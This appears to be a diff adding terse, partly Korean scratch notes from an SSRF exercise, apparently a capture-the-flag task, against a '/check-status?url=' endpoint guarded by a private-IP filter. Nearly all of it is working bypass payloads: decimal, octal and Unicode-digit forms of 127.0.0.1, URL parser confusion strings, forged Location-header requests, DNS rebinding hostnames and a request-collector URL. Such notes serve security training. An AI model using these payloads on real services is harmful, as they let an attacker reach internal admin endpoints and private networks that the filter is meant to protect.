@@ -1,0 +1,164 @@
+/check-status?url=<IP>
+
+valid_ip 함수 (검증)
+
+location <- redirection 검증 
+IP<- 조건 우회 ()
+
+ip : [A, B, C, D]
+
+ip[0] == [0, 10, 127] 
+	or (A == 172 and (B > 15 or B < 32))
+	or (A == 169 and (B == 254))
+	or (A == 192 and (B == 168))
+-> return False
+
+
+-> return true
+get()
+headers line	
+->location : <IP>
+valid_ip(urlparse(IP).netloc) == False
+
+http://34.84.111.201/
+-> 내부망 접근
+
+/admin-status
+
+http://172.18.119.242/yw.php
+http://185.199.108.153/yw.php
+
+⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
+⒈⒉⒎.⒈.⒈.⒈/admin-status
+
+Location: http://34.84.111.201
+Location: http://127.0.0.1/admin-status
+
+Location: http://34.84.111.201/admin-status
+SSRF
+
+-> http://172.18.119.242/yw.php
+
+
+ 172.18.119.242
+
+127.0.0.1
+2130706433
+0177.1
+
+http://2130706433/
+
+017700000001
+
+localtest.me
+
+GET /check-status?url=http://34.84.111.201/ 1.1.1.1 HTTP/1.1
+Host: 34.84.111.201:5000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: */*
+Referer: http://172.18.119.242:5000/
+Accept-Encoding: gzip, deflate
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+location: http://2130706433/admin-status
+Connection: close
+
+
+
+http://1.1.1.1 &@127.0.0.1/admin-status# @3.3.3./
+
+http://34.84.111.201/check-status?url=1.1.1.1 &@http://127.0.0.1/admin-status# @3.3.3.3/
+
+http://34.84.111.201/check-status?url=1.1.1.1 &@https://b92311330cf132fa9cde87949527403b.m.pipedream.net# @3.3.3.3/
+
+http://1.1.1.1 &@https://b92311330cf132fa9cde87949527403b.m.pipedream.net# @3.3.3.3/
+
+
+
+
+GET / HTTP/1.1
+Host: 34.84.111.201
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: */*
+Referer: http://34.84.111.201/
+Accept-Encoding: gzip, deflate
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+location: http://017700000001/admin-status
+Connection: close
+
+GET /admin-status HTTP/1.1
+Host: 172.18.119.242:5000
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+location: http://017700000001/admin-status
+Connection: close
+
+301 Moved Permanently 발생 시키기
+-> location 으로 이동 
+
+http://0177.0.0.01/admin-status
+
+location<-/check-status
+
+/admin-status
+
+--------------------------------
+
+location
+
+http://1.1.1.1 &@https://b92311330cf132fa9cde87949527403b.m.pipedream.net# @3.3.3.3/
+
+
+check-status?url[]=http://1.1.1.1&url[]=http://127.0.0.1
+
+
+
+𝟥𝟪³。𝟚⁵𝟞。²₅𝟞。²𝟧𝟟/admin-status
+017700000001
+
+http:://::1/128
+
+00177.000.0000.000001
+
+http://30.30.30.30# &@http://00177.000.0000.000001/admin-status# @3.3.3.3/
+http://1.1.1.1# &@http://017700000001/admin-status# @3.3.3.3/
+http://30.30.30.30# &@00177.000.0000.000001/admin-status# @3.3.3.3/
+
+host = '\\n\\a\\v\\e\\r.c\\o\\m'
+
+http://1.1.1.1/# &@127.0.0.1/admin-status# @3.3.3.3/
+
+http://40.40.40.40/# &@383.256.256.257# @3.3.3.3/
+
+http://\\n\\a\\v\\e\\r.c\\o\\m
+
+http://1.1.1.1 &@@http://017700000001/admin-status# @3.3.3.3/
+
+http://1.1.1.1 &@@http://017700000001/api/true-answer# @3.3.3.3/
+
+gethostbyname -> string -> Dec
+http://\1\2\7.\0.\0.\1
+host = \\l\\o\\c\\a\\l\\h\\o\\s\\t
+http://\\l\\o\\c\\a\\l\\h\\o\\s\\t/admin-status
+
+http://\l\o\c\a\l\h\o\s\t/admin-status
+http://\l\o\c\a\l\h\o\s\t/
+
+7f000001.ac127001.rbndr.us
+7f000001.7f000001.rbndr.us
+
+http://\l\o\c\a\l\h\o\s\t/# &@http://\l\o\c\a\l\h\o\s\t/admin-status# @3.3.3.3/
+
+35.187.217.28
+
+DNS Binding !!
+http://23bbd91c.7f000001.rbndr.us/admin-status
+35.187.217.28->127.0.0.1
+
+http://#@evil.com
+
+
+http://172.18.113.252:4200/api/true-answer
